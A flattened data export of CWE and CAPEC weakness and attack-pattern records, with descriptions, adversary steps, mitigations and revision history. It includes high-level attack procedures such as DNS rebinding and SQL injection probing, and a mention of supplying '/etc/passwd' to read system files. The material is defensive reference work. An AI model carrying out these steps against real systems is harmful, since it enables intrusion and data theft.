19763	23	Authenticating a user, or otherwise establishing a new user session, without invalidating any existing session identifier gives an attacker the opportunity to steal authenticated sessions.
13101	39	2008-09-08
20842	54	High
25386	28	CWE Content Team
11469	51	2018-07-31
11882	67	High
10527	35	MITRE
12597	63	Bypass Protection Mechanism
23979	39	2013-02-21
14682	62	updated Enabling_Factors_for_Exploitation
9485	21	CWE Content Team
10284	91	Implementation
11165	31	1000
25309	89	Standard
21232	28	CWE Content Team
24288	62	updated Description
15824	63	Quality Degradation
18661	39	2012-05-11
15971	91	Implementation
21178	77	Automated Static Analysis - Source Code
6934	26	Architecture and Design
10685	35	MITRE
8178	56	ChildOf
13311	56	ChildOf
22316	69	Incomplete
23602	80	Brute force attack
12567	23	An adversary serves content whose IP address is resolved by a DNS server that the adversary controls. After initial contact by a web browser (or similar client), the adversary changes the IP address, to which its name resolves, to an address within the target organization that is not publicly accessible. This allows the web browser to examine this internal address on behalf of the adversary. Web browsers enforce security zones based on DNS names in order to prevent cross-zone disclosure of information. In a DNS binding attack, an adversary publishes content on their own server with their own name and DNS server. The first time the target accesses the adversary's content, the adversary's name must be resolved to an IP address. The adversary's DNS server performs this resolution and provides a short Time-To-Live (TTL) in order to prevent the target from caching the value. When the target makes a subsequent request to the adversary's content, the adversary's DNS server must again be queried, but this time the DNS server returns an address internal to the target's organization that would not be accessible from an outside source. Because the same name resolves to both these IP addresses, browsers will place both IP addresses in the same security zone and allow information to flow between the addresses. The adversary can then use scripts in the content the target retrieved from the adversary in the original message to exfiltrate data from the named internal addresses. This allows adversaries to discover sensitive information about the internal network of an enterprise. If there is a trust relationship between the computer with the targeted browser and the internal machine the adversary identifies, additional attacks are possible. This attack differs from pharming attacks in that the adversary is the legitimate owner of the malicious DNS server and so does not need to compromise behavior of external DNS services.
11293	95	[Directory Discovery] Use a method, either manual, scripted, or automated to discover the directories on the server by making requests for directories that may possibly exist. During this phase the adversary is less concerned with whether a directory can be accessed or indexed and more focused on simply discovering what directories do exist on the target.
16932	103	Primary
10429	52	Since this weakness does not typically appear frequently within a single software package, manual white box techniques may be able to provide sufficient code coverage and reduction of false positives if all potentially-vulnerable operations can be assessed within limited time constraints.
12555	101	CAPEC Content Team
11590	62	updated Description, Name
12847	39	2010-09-27
6941	79	Authorization
18732	103	Primary
8063	67	High
15744	56	ChildOf
24145	69	Incomplete
19209	39	2012-10-30
17579	46	These global variables could be overwritten by POST requests, cookies, or other methods of populating or overwriting these variables. This could be used to read or process arbitrary files by providing values such as "/etc/passwd".
14919	91	Implementation
24276	42	Ensure that error messages only contain minimal details that are useful to the intended audience, and nobody else. The messages need to strike the balance between being too cryptic and not being cryptic enough. They should not necessarily reveal the methods that were used to determine the error. Such detailed information can be used to refine the original attack to increase the chances of success.                   If errors must be tracked in some detail, capture them in log messages - but consider what could occur if the log messages can be viewed by attackers. Avoid recording highly sensitive information such as passwords in any form. Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a username is valid or not.
14614	81	Integrity
12328	46	An information exposure occurs when system data or debugging information leaves the program through an output stream or logging function that makes it accessible to unauthorized parties. An attacker can also cause errors to occur by submitting unusual requests to the web application. The response to these errors can reveal detailed system information, deny service, cause security mechanisms to fail, and crash the server. An attacker can use error messages that reveal technologies, operating systems, and product versions to tune the attack against known vulnerabilities in these technologies. An application may use diagnostic methods that provide significant implementation details such as stack traces as part of its error handling mechanism.
23828	39	2012-10-30
17796	35	MITRE
10573	62	updated Relationships, Taxonomy_Mappings
21231	28	CWE Content Team
25159	56	ChildOf
19735	91	Implementation
6876	54	High
7932	62	updated Time_of_Introduction
8401	46	This reliance on "security through obscurity" can produce resultant weaknesses if an attacker is able to reverse engineer the inner workings of the mechanism. Note that obscurity can be one small part of defense in depth, since it can create more work for an attacker; however, it is a significant risk if used as the primary means of protection.
23561	63	DoS: Resource Consumption (Memory)
10025	43	Simple
11390	28	CWE Content Team
23120	39	2008-07-01
11194	35	MITRE
9049	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
10949	40	The attacker must be able to write to resources or redirect access to the service registry.
6419	40	The target server cannot differentiate real requests from forged requests
12628	43	Simple
5588	23	An adversary registers a domain name that sounds the same as a trusted domain, but has a different spelling. A SoundSquatting attack takes advantage of a user's confusion of the two words to direct Internet traffic to adversary-controlled destinations. SoundSquatting does not require an attack against the trusted domain or complicated reverse engineering.
18432	23	An adversary exploits the temporary, insecure storage of information by monitoring the content of files used to store temp data during an application's routine execution flow. Many applications use temporary files to accelerate processing or to provide records of state across multiple executions of the application. Sometimes, however, these temporary files may end up storing sensitive information. By screening an application's temporary files, an adversary might be able to discover such sensitive information. For example, web browsers often cache content to accelerate subsequent lookups. If the content contains sensitive information then the adversary could recover this from the web cache.
18282	81	Access Control
13494	39	2019-01-03
20412	50	Implementation: Perform input validation for all remote content, including remote and user-generated content
15696	39	2018-03-27
18722	45	Base
6155	39	2012-05-11
12959	92	Experiment
22806	28	Eric Dalci
9693	39	2012-05-11
19176	59	Updated Description, Description Summary, References, Related_Weaknesses, Solutions_and_Mitigations
17905	35	MITRE
22572	55	CAPEC Content Team
23957	46	After a file descriptor for a particular file or device has been released, it can be reused. The code might not write to the original file, since the reused file descriptor might reference a different file or device.
12133	100	The MITRE Corporation
11002	62	updated Demonstrative_Examples
7788	35	MITRE
7942	33	Michael Howard
11564	28	CWE Content Team
19000	35	MITRE
7260	39	2017-11-08
15273	28	CWE Content Team
10426	39	2012-10-30
23048	76	2019-04-04
6878	73	Port mapping by exploring the operating system (netstat, sockstat, etc.)
11643	35	MITRE
13299	62	updated References, Related_Attack_Patterns, Relationships, Taxonomy_Mappings
17823	62	updated Relationships, Taxonomy_Mappings
18573	104	435
22912	62	updated Description, Name, Relationships
7892	28	CWE Content Team
16603	103	Primary
14499	76	2018-07-31
14001	35	MITRE
16900	72	The main problem is that -- if a lock is overcome -- data could be altered in a bad state.
14115	39	2011-06-01
8742	31	1000
6372	95	If the source code is not available, write a small program that loops through various possible inputs to given API call and tries a variety of alternate (but equivalent) encodings of strings with leading ghost characters. Knowledge of frameworks and libraries used and what filters they apply will help to make this search more structured.
19273	89	Standard
8358	62	updated Relationships, Other_Notes
17572	28	CWE Content Team
15264	62	updated Potential_Mitigations, Time_of_Introduction
15428	33	Justin Schuh
12672	36	http://www.blackhat.com/presentations/bh-europe-00/HalvarFlake/HalvarFlake.ppt
20226	76	2019-04-04
20042	71	2001
15009	39	2008-10-14
15153	63	Gain Privileges or Assume Identity
6091	33	Jim Manico
8856	28	CWE Content Team
17089	39	2012-05-11
21785	35	MITRE
14466	62	updated Relationships, Other_Notes, Taxonomy_Mappings
23998	35	MITRE
9094	103	Primary
22209	31	1000
21281	102	ChildOf
7596	63	Gain Privileges or Assume Identity
6805	39	2014-07-30
8992	76	2018-07-31
6925	28	CWE Content Team
21560	28	CWE Content Team
19854	35	MITRE
14909	91	Implementation
9736	56	CanPrecede
11147	47	Other
13705	51	2014-06-23
8004	90	Language-Independent
11778	101	CAPEC Content Team
13040	74	1
8201	35	MITRE
8276	79	Confidentiality
11684	81	Availability
13180	62	added/updated demonstrative examples
10967	35	Cigital
17101	26	Architecture and Design
22112	27	None: No specialized resources are required to execute this type of attack.
14358	57	Primary
24138	39	2012-10-30
16860	28	CWE Content Team
19536	101	CAPEC Content Team
15530	47	Gain Privileges
17760	39	2011-06-01
7845	23	The Android application exports a component for use by other applications, but does not properly restrict which applications can launch the component or access the data it contains.
20635	102	ChildOf
14662	81	Access Control
13728	39	2012-05-11
5936	54	Low
9250	103	Primary
24577	51	2014-06-23
17405	69	Incomplete
17917	39	2011-06-01
10309	66	NetSec Security Advisory: Multiple Vulnerabilities Resulting From Use Of Apple OSX HFS+
8068	62	updated Common_Consequences
6542	35	MITRE
19383	39	2008-09-08
23091	69	Incomplete
7900	28	CWE Content Team
11688	97	Block Access to Libraries
7936	35	MITRE
8785	21	CWE Content Team
9771	51	2014-06-23
6981	62	added/updated white box definitions
18888	28	CWE Content Team
9694	28	CWE Content Team
20559	28	CWE Content Team
16859	95	[Cache poisoning] The adversary decides to target the cache server by forging new responses. The server will then cache the second request and response. The cached response has most likely an attack vector like Cross-Site Scripting; this attack will then be serve to many clients due to the caching system.
16827	73	Hide action controls over very psychologically tempting content.
15068	28	CWE Content Team
23183	88	Insufficient Control of Network Message Volume (Network Amplification)
7446	39	2008-07-01
15145	62	updated Potential_Mitigations
25174	92	Exploit
24074	62	updated Relationships, Taxonomy_Mappings
8036	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
19722	62	updated Description, Name, Relationships
11726	39	2009-03-10
15226	28	Eric Dalci
17321	89	Standard
6879	28	CWE Content Team
10795	43	Simple
18600	97	Pretexting via Phone
7757	39	2009-07-27
23808	35	MITRE
18318	35	MITRE
25099	91	Requirements
18473	39	2008-10-14
11131	39	2012-05-11
23122	35	MITRE
14057	28	CWE Content Team
25327	102	ChildOf
19216	28	CWE Content Team
17476	49	2001
21884	62	updated Potential_Mitigations, Time_of_Introduction
6353	53	The MITRE Corporation
9168	39	2008-07-01
16873	73	Manually inject specific payload into targeted argument.
23233	35	MITRE
17728	45	Base
10188	100	The MITRE Corporation
7565	53	The MITRE Corporation
13702	39	2008-07-01
9706	39	2008-09-08
7984	62	updated Relationships, Type
12148	85	271
14214	23	Applications often need to transform data in and out of the XML format by using an XML parser. It may be possible for an adversary to inject data that may have an adverse effect on the XML parser when it is being processed. By nesting XML data and causing this data to be continuously self-referential, an adversary can cause the XML parser to consume more resources while processing, causing excessive memory consumption and CPU utilization. An adversary's goal is to leverage parser failure to his or her advantage. In most cases this type of an attack will result in a XML Denial of Service (XDoS) due to an application becoming unstable, freezing, or crashing. However it may be possible to cause a crash resulting in arbitrary code execution, leading to a jump from the data plane to the control plane [R.230.1]. XDoS is most closely associated with web services, SOAP, and Rest, because remote service requesters can post malicious XML payloads to the service provider designed to exhaust the service provider's memory, CPU, and/or disk space. The main weakness in XDoS is that the service provider generally must inspect, parse, and validate the XML messages to determine routing, workflow, security considerations, and so on. It is exactly these inspection, parsing, and validation routines that XDoS targets. This attack exploits the loosely coupled nature of web services, where the service provider has little to no control over the service requester and any messages the service requester sends.
22186	100	The MITRE Corporation
15139	27	A client application, such as a web browser, or a scripting language capable of interacting with the target.
19527	81	Integrity
21896	62	updated Relationships, References
24826	28	Eric Dalci
8218	43	Simple
5751	63	Unexpected State
21048	35	MITRE
14653	56	ChildOf
23746	45	Variant
8786	81	Access Control
16115	35	MITRE
8210	62	updated Potential_Mitigations
18715	72	Arbitrary code execution is possible if an uploaded file is interpreted and executed as code by the recipient. This is especially true for .asp and .php extensions uploaded to web servers because these file types are often treated as automatically executable, even when file system permissions do not specify execution. For example, in Unix environments, programs typically cannot run unless the execute bit is set, but PHP programs may be executed by the web server without directly invoking them on the operating system.
6138	91	System Configuration
16037	45	Variant
24039	49	2016
21934	94	Run Arbitrary Code
23231	28	CWE Content Team
24256	78	Very High
6692	102	ChildOf
8989	62	updated Relationships, Taxonomy_Mappings
21469	35	MITRE
18845	35	MITRE
18091	35	Cigital
16211	81	Other
21301	62	updated Demonstrative_Examples
16231	28	CWE Content Team
6659	31	1000
7419	62	updated Relationships
20535	73	Utilize social engineering attack patterns such as Pretexting. See also: CAPEC-407.
25303	35	MITRE
16394	35	MITRE
19568	28	CWE Content Team
11206	62	updated Taxonomy_Mappings
22044	62	updated Relationships
24546	39	2008-09-08
11553	24	MITRE
6367	91	Implementation
20069	66	OS Commanding
9320	35	MITRE
25354	39	2012-05-11
21008	28	CWE Content Team
13277	91	System Configuration
5762	72	An attacker with access to the system could read sensitive information stored in cleartext.
23068	28	CWE Content Team
8303	46	The programmer may assume that certain events or conditions will never occur or do not need to be worried about, such as low memory conditions, lack of access to resources due to restrictive permissions, or misbehaving clients or components. However, attackers may intentionally trigger these unusual conditions, thus violating the programmer's assumptions, possibly introducing instability, incorrect behavior, or a vulnerability.             Note that this entry is not exclusively about the use of exceptions and exception handling, which are mechanisms for both checking and handling unusual or unexpected conditions.
16567	39	2014-07-30
17660	76	2019-09-30
8620	55	CAPEC Content Team
5901	94	Run Arbitrary Code
24430	28	CWE Content Team
16758	28	CWE Content Team
17374	66	Input Validation - Not That Important
12722	35	MITRE
8873	28	Eric Dalci
9125	79	Integrity
10532	39	2009-12-28
6947	67	Medium
5976	31	1000
14841	28	KDM Analytics
25300	79	Access Control
21149	39	2011-06-01
10664	39	2015-12-07
21648	21	PLOVER
14473	62	updated Time_of_Introduction
6615	62	updated Relationships
11339	28	CWE Content Team
8474	28	CWE Content Team
16828	39	2008-10-14
18461	95	[Determine user-controllable input susceptible to injection] Determine the user-controllable input susceptible to injection. For each user-controllable input that the adversary suspects is vulnerable to SQL injection, attempt to inject the values determined in the previous step. If an error does not occur, then the adversary knows that the SQL injection was successful.
22400	28	CWE Content Team
13488	35	MITRE
11658	74	2
18042	75	The effectiveness and speed of manual analysis will be reduced if the there is not a centralized security mechanism, and the security logic is widely distributed throughout the software.
7985	28	CWE Content Team
13600	69	Draft
19428	77	Automated Static Analysis - Binary or Bytecode
12861	62	updated Common_Consequences
13996	39	2013-02-21
22415	35	MITRE
16761	47	Gain Privileges
17132	35	Cigital
8579	55	CAPEC Content Team
10185	39	2013-07-17
21197	28	CWE Content Team
13491	28	CWE Content Team
8851	88	Cleartext Storage of Sensitive Information in a Cookie
25140	79	Authorization
7034	88	Privilege Defined With Unsafe Actions
7356	30	Erika Chin
18093	62	updated Common_Consequences, Description, Detection_Factors, Modes_of_Introduction, Potential_Mitigations, References, Time_of_Introduction
14801	63	Unexpected State
21603	35	MITRE
16616	35	MITRE
7376	76	2015-12-07
20548	90	Language-Independent
24474	28	CWE Content Team
24822	39	2012-05-11
17988	28	CWE Content Team
19846	103	Primary
20947	28	CWE Content Team
12256	35	MITRE
7618	63	DoS: Crash, Exit, or Restart
25056	35	MITRE
18339	104	306
11982	39	2012-10-30
17189	39	2008-09-08
25286	103	Primary
13379	35	Cigital
10085	45	Variant
19402	35	MITRE
12247	35	MITRE
10328	28	CWE Content Team
18533	62	updated Other_Notes, References
25342	62	updated Relationships
17567	35	MITRE
14256	62	updated Relationships
16587	62	updated References, Relationships
12001	28	CWE Content Team
7534	62	updated Relationships
17096	50	Use language APIs rather than relying on passing data to the operating system shell or command line. Doing so ensures that the available protection mechanisms in the language are intact and applicable.
16873	95	[Abuse of the application] The attacker injects specific syntax into a particular argument in order to generate a specific malicious effect in the targeted application.
16853	28	CWE Content Team
21517	57	Indirect
20145	53	The MITRE Corporation
19594	35	MITRE
15007	49	2010
15037	91	Operation
17692	21	CLASP
8601	42	Developers should anticipate that parameter/argument delimiters will be injected/removed/manipulated in the input vectors of their software system. Use an appropriate combination of black lists and whitelists to ensure only valid, expected and appropriate input is processed by the system.
7400	28	Eric Dalci
13350	62	updated Modes_of_Introduction, Relationships
7798	62	updated Relationships
21289	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
15726	62	updated Applicable_Platforms, References, Relationships
17321	97	XML Routing Detour Attacks
11615	28	CWE Content Team
18953	35	MITRE
12637	89	Detailed
12488	28	CWE Content Team
7295	69	Draft
6568	39	2011-06-01
15104	57	Primary
20335	81	Integrity
7335	91	Implementation
14662	63	Gain Privileges or Assume Identity
15072	28	CWE Content Team
24012	66	CommanderSong: A Systematic Approach for Practical Adversarial Voice Recognition
8653	86	http://www.ibm.com/developerworks/xml/library/x-tipcfsx.html
8637	69	Incomplete
20529	103	Primary
19723	69	Incomplete
20039	26	Implementation
24514	35	MITRE
19485	39	2019-01-03
6147	35	MITRE
6856	28	CWE Content Team
22331	26	Architecture and Design
24592	39	2010-04-05
11983	62	updated References, Relationships
18143	88	The UI Performs the Wrong Action
16995	103	Primary
9355	104	172
12978	40	Tainted data from the attacker is used and copied to temporary files.
7354	39	2010-04-05
22449	79	Access Control
6455	91	Architecture and Design
8081	35	MITRE
23719	103	Primary
22311	90	Language-Independent
5689	42	Implement and perform bounds checking on input.
16566	28	CWE Content Team
18322	28	Sean Eidemiller
12016	39	2014-07-30
16065	21	CWE Content Team
6797	47	Read Data
16248	49	2010
8893	23	The software allocates file descriptors or handles on behalf of an actor without imposing any restrictions on how many descriptors can be allocated, in violation of the intended security policy for that actor.
11947	35	MITRE
17512	93	Moderate
15470	39	2010-02-16
16536	35	MITRE
20550	35	MITRE
6011	104	530
21540	50	Utilize strict type, character, and encoding enforcement.
19132	28	CWE Content Team
16855	39	2011-09-13
24447	90	C
19237	85	575
13902	35	Cigital
20040	69	Draft
23778	50	Design: Avoid dependence on DNS
17301	39	2008-09-08
10573	39	2012-05-11
14288	88	Struts: Unused Validation Form
24248	35	MITRE
20636	91	Implementation
20940	81	Confidentiality
11438	39	2011-06-01
15958	45	Variant
22804	28	CWE Content Team
11405	35	MITRE
16307	91	Implementation
24920	28	CWE Content Team
11320	100	The MITRE Corporation
8994	56	ChildOf
12305	91	Implementation
5940	91	Architecture and Design
17438	39	2014-02-18
18514	35	MITRE
10036	88	Improper Control of Resource Identifiers ('Resource Injection')
18036	31	1000
17973	40	The attacker must have working knowledge of some if not all of the components involved in the IDE system as well as the infrastructure.
11542	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Framework-based Fuzzer                                                                     Cost effective for partial coverage:                                                                           Fuzz Tester                            Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious
14679	79	Availability
8266	63	Read Files or Directories
8638	76	2015-11-09
7978	43	Simple
18388	51	2014-06-23
16060	59	Updated Description, Related_Weaknesses
24794	35	MITRE
5962	81	Confidentiality
22811	28	CWE Content Team
13043	91	Architecture and Design
19365	28	CWE Content Team
14589	39	2009-05-27
15988	56	ChildOf
19911	47	Other
11869	39	2008-11-24
12852	28	CWE Content Team
12141	47	Hide Activities
17767	28	CWE Content Team
15451	81	Access Control
19257	39	2008-09-08
24838	28	CWE Content Team
12974	39	2010-09-27
20042	84	03
22199	35	MITRE
21079	90	C++
12675	39	2008-11-24
8789	39	2014-07-30
18390	50	Automatic randomization of WiFi MAC addresses
16408	31	1000
17327	39	2014-07-30
19135	39	2012-05-11
13142	35	MITRE
22194	28	CWE Content Team
6714	35	MITRE
17459	81	Availability
22019	62	updated Demonstrative_Examples, Description, Other_Notes
14609	39	2010-04-05
14625	28	CWE Content Team
8103	25	Low
9010	62	updated Observed_Examples, Related_Attack_Patterns, Relationships
14765	35	MITRE
8406	50	Protect the communication between the client and server. For instance it is best practice to use SSL to mitigate man in the middle attack.
9106	47	Modify Data
8411	35	MITRE
21261	76	2015-11-09
8036	26	Architecture and Design
6405	61	Draft
15623	88	Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
20884	77	Architecture or Design Review
13469	31	1000
7776	101	CAPEC Content Team
9861	21	Anonymous Tool Vendor (under NDA)
13932	35	MITRE
10701	88	Parent Class without Virtual Destructor Method
7969	103	Primary
6013	62	updated Relationships
13804	35	MITRE
23630	50	Identify programs (such as "net") that may be used to enumerate local group permissions and block them by using a software restriction Policy or tools that restrict program execution by process whitelisting.
15309	30	J. Mogul
15164	35	MITRE
24056	28	CWE Content Team
8884	60	02
20314	103	Primary
9280	28	CWE Content Team
15027	50	Regularly patch all software.
15201	35	MITRE
12138	59	Updated References, Related_Weaknesses
19690	28	CWE Content Team
9422	25	Medium
24380	35	MITRE
8697	39	2008-09-08
19353	81	Access Control
24650	39	2012-10-30
12798	62	updated Common_Consequences, Observed_Examples, Relationships
17534	63	Reduce Maintainability
24889	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
21182	62	updated Common_Consequences, Potential_Mitigations, References
8220	62	updated Description
24243	62	updated References, Relationships, Taxonomy_Mappings
23356	28	CWE Content Team
9977	28	CWE Content Team
16543	88	Race Condition in Switch
11660	90	Language-Independent
23464	62	updated Common_Consequences, Relationships
21726	47	Other
21731	39	2009-07-27
21399	39	2011-03-29
11548	39	2008-07-01
22833	35	MITRE
22207	79	Confidentiality
10585	39	2014-07-30
9363	35	MITRE
11762	39	2010-04-05
11851	56	ChildOf
13500	62	updated Applicable_Platforms, Taxonomy_Mappings
24378	63	Varies by Context
14980	21	7 Pernicious Kingdoms
12330	63	Hide Activities
12354	81	Integrity
6114	39	2017-11-08
22820	101	CAPEC Content Team
8355	35	MITRE
12966	35	MITRE
16267	100	The MITRE Corporation
12103	101	CAPEC Content Team
16231	39	2017-11-08
9609	26	Implementation
17973	85	511
11438	35	MITRE
12024	66	Android Bad Practices: Sticky Broadcast
16190	42	Clone the member data and keep an unmodified version of the data private to the object.
19371	62	updated Modes_of_Introduction, Observed_Examples, Other_Notes, Relationship_Notes
22716	35	MITRE
14515	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
12092	39	2008-09-08
8830	63	Read Application Data
18289	62	updated Potential_Mitigations
6553	92	Explore
16015	95	[Identify Target] Attacker identifies the target application by determining whether there is sufficient check before writing data to a file and creating symlinks to files in different directories.
18296	62	updated Relationships
11429	35	MITRE
15659	35	MITRE
17067	52	Exploitation of incomplete blacklist weaknesses using the obvious manipulations might fail, but minor variations might succeed.
15490	85	170
12206	40	The target application must leverage an open communications channel.
9092	35	MITRE
20641	53	The MITRE Corporation
15340	103	Primary
19445	35	MITRE
18029	28	Eric Dalci
23754	35	MITRE
18836	63	Other
22600	39	2011-06-01
7741	31	1000
6247	25	High
8338	39	2010-02-16
10035	28	CWE Content Team
13309	35	MITRE
20367	56	ChildOf
16898	55	CAPEC Content Team
24992	66	SQL Injection Attacks by Example
17888	72	The communications between components can be modified in unexpected ways. Unexpected commands can be executed, bypassing other security mechanisms. Incoming data can be misinterpreted.
13945	39	2011-06-01
14878	48	01
21455	62	updated Relationships, Taxonomy_Mappings
14526	35	MITRE
9402	39	2012-10-30
15163	28	CWE Content Team
23813	39	2008-09-08
17655	35	MITRE
6543	56	PeerOf
9399	62	updated Potential_Mitigations
7257	35	MITRE
11137	101	CAPEC Content Team
16636	56	ChildOf
10144	61	Stable
11623	31	1000
5865	89	Standard
16815	53	The MITRE Corporation
10676	28	CWE Content Team
17812	26	Architecture and Design
11298	67	Medium
19997	91	Implementation
8397	50	Employ the principle of least privilege: limit service accounts privileges to what is required for functionality and no more.
21164	53	The MITRE Corporation
9186	56	ChildOf
20670	62	updated Likelihood_of_Exploit, Relationships, Taxonomy_Mappings
12890	56	ChildOf
21736	25	High
9436	55	CAPEC Content Team
17339	35	MITRE
20555	28	CWE Content Team
15194	28	CWE Content Team
23355	35	MITRE
6409	72	The system's security functionality is turned against the system by the attacker.
13636	76	2019-04-04
10125	80	The attacker most likely has to be familiar with the internal functionality of the system to launch this attack. Without that knowledge, there are not many feedback mechanisms to give an attacker the indication of how to perform command injection or whether the attack is succeeding.
5814	90	Language-Independent
14648	62	updated Common_Consequences
16746	81	Availability
18584	39	2012-10-30
12059	35	Cigital
22917	63	Varies by Context
25258	31	699
19294	79	Authorization
5973	62	updated Common_Consequences
20539	51	2017-04-15
6508	28	CWE Content Team
6442	39	2014-07-30
24658	76	2019-09-30
8859	63	Hide Activities
20459	61	Draft
16249	28	CWE Content Team
23318	91	Architecture and Design
19005	62	updated Demonstrative_Examples, References, Relationships
11611	28	CWE Content Team
11655	53	The MITRE Corporation
10108	28	CWE Content Team
7323	56	ChildOf
16519	91	Implementation
17352	39	2008-07-01
16307	42	Use functions or hardware which use a hardware-based random number generation for all crypto. This is the recommended solution. Use CyptGenRandom on Windows, or hw_rand() on Linux.
7846	50	Distort packet sizes and timing at VPN layer by adding padding to normalize packet sizes and timing delays to reduce information leakage via timing.
8820	91	Operation
11366	39	2009-03-10
12512	91	Operation
19402	62	updated Common_Consequences
22833	39	2012-05-11
5964	55	CAPEC Content Team
23612	81	Other
18176	23	The attacker extracts credentials used for code signing from a production environment and then uses these credentials to sign malicious content with the developer's key. Many developers use signing keys to sign code or hashes of code. When users or applications verify the signatures are accurate they are led to believe that the code came from the owner of the signing key and that the code has not been modified since the signature was applied. If the attacker has extracted the signing credentials then they can use those credentials to sign their own code bundles. Users or tools that verify the signatures attached to the code will likely assume the code came from the legitimate developer and install or run the code, effectively allowing the attacker to execute arbitrary code on the victim's computer.
19552	31	1000
14085	35	MITRE
15023	35	MITRE
18646	35	MITRE
8763	56	ChildOf
23351	27	None: No specialized resources are required to execute this type of attack.
20997	46	These types of errors are generally the result of a typo.
22146	79	Confidentiality
21351	100	The MITRE Corporation
25385	28	CWE Content Team
5723	59	Updated Description Summary, Resources_Required
15278	69	Incomplete
6932	81	Confidentiality
13343	62	updated Applicable_Platforms, Demonstrative_Examples, Description, Other_Notes, Terminology_Notes
13484	46	This makes it easier for attackers to pre-compute the hash value using dictionary attack techniques such as rainbow tables, effectively disabling the protection that an unpredictable salt would provide.             It should be noted that, despite common perceptions, the use of a good salt with a hash does not sufficiently increase the effort for an attacker who is targeting an individual password, or who has a large amount of computing resources available, such as with cloud-based services or specialized, inexpensive hardware. Offline password cracking can still be effective if the hash function is not expensive to compute; many cryptographic functions are designed to be efficient and can be vulnerable to attacks using massive computing resources, even if the hash is cryptographically strong. The use of a salt only slightly increases the computing requirements for an attacker compared to other strategies such as adaptive hash functions. See CWE-916 for more details.
17152	35	MITRE
15027	50	Execute all suspicious files in a sandbox environment.
18378	88	Insufficient Verification of Data Authenticity
16536	62	updated Description, Modes_of_Introduction, Name, Relationships
22535	62	updated Demonstrative_Examples, Name
23608	51	2014-06-23
7402	53	The MITRE Corporation
5624	61	Draft
9326	28	CWE Content Team
9004	28	CWE Content Team
11062	52	Automated measurement of the entropy of an input/output source may indicate the use or lack of encryption, but human analysis is still required to distinguish intentionally-unencrypted data (e.g. metadata) from sensitive data.
18647	81	Other
23824	39	2011-03-29
21141	81	Confidentiality
17525	73	Use an automated injection attack tool to inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a server-side script elements context and observe system behavior to determine if script was executed.
19395	43	Simple
10818	39	2017-11-08
20878	62	updated Alternate_Terms, Applicable_Platforms, Description, Maintenance_Notes, Observed_Examples, References, Relationship_Notes, Relationships
25293	78	High
17183	78	Medium
13136	81	Other
7307	48	01
24399	89	Standard
22158	21	PLOVER
6550	59	Updated Related_Attack_Patterns
6275	28	CWE Content Team
18337	28	CWE Content Team
16921	28	CWE Content Team
9758	62	updated Related_Attack_Patterns
15102	56	ChildOf
21494	35	MITRE
20147	62	updated Relationships
19793	62	updated Relationships, Taxonomy_Mappings, Weakness_Ordinalities
7312	66	Least Privilege
14414	28	CWE Content Team
10622	97	Protocol Analysis
14040	62	updated Relationships, Taxonomy_Mappings
20074	23	The software uses the size of a source buffer when reading from or writing to a destination buffer, which may cause it to access memory that is outside of the bounds of the buffer.
21296	94	By disabling certain security tools, the adversary can hide malicious activity and avoid detection.
11899	39	2019-01-03
12289	50	Insure that binaries commonly used by the system have the correct file permissions. Set operating system policies that restrict privilege elevation of non-Administrators. Use auditing tools to observe changes to system services.
11220	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Bytecode Weakness Analysis - including disassembler + source code weakness analysis                            Binary Weakness Analysis - including disassembler + source code weakness analysis
8458	69	Draft
21633	28	CWE Content Team
23606	81	Non-Repudiation
11650	39	2011-03-29
22464	62	updated Observed_Examples, References, Relationships, Taxonomy_Mappings
24273	35	MITRE
19723	45	Class
18652	33	Internet Security
7328	28	CWE Content Team
8637	45	Class
13417	39	2012-05-11
6126	81	Integrity
18246	72	An attacker may be able to traverse the file system to unintended locations and read or overwrite the contents of unexpected files. If the files are used for a security mechanism then an attacker may be able to bypass the mechanism.
19571	62	updated Causal_Nature, Relationships
15078	39	2013-02-21
19823	80	The adversary requires strong inter-personal and communication skills.
23651	59	Updated References
10347	63	Execute Unauthorized Code or Commands
15041	39	2019-01-03
11109	100	The MITRE Corporation
9563	36	https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Exploit%3AJava%2FByteVerify.C
25128	104	200
10722	31	1000
11379	63	DoS: Resource Consumption (Memory)
13643	51	2014-06-23
19825	62	updated Potential_Mitigations
11836	62	updated Relationships, Relationship_Notes, Taxonomy_Mappings
17233	35	Cigital
15656	35	MITRE
20764	103	Primary
7164	92	Explore
8937	63	Reduce Reliability
12907	101	CAPEC Content Team
14537	35	MITRE
16390	62	updated Alternate_Terms, Common_Consequences
23311	35	MITRE
18342	31	1000
13259	59	Updated Related_Attack_Patterns
8686	35	MITRE
7442	35	MITRE
12310	77	Automated Static Analysis - Binary or Bytecode
15573	28	CWE Content Team
13883	23	An attacker with access to an open source code project (OSS) and knowledge of its particular use for in a system being developed, manufactured, or supported for the victim, can insert malicious code into the open source software used for math libraries in anticipation of inclusion into the system for the purpose of disruption or further compromise within the victim organization.
11854	72	By reading out-of-bounds memory, an attacker might be able to get secret values, such as memory addresses, which can be bypass protection mechanisms such as ASLR in order to improve the reliability and likelihood of exploiting a separate weakness to achieve code execution instead of just denial of service.
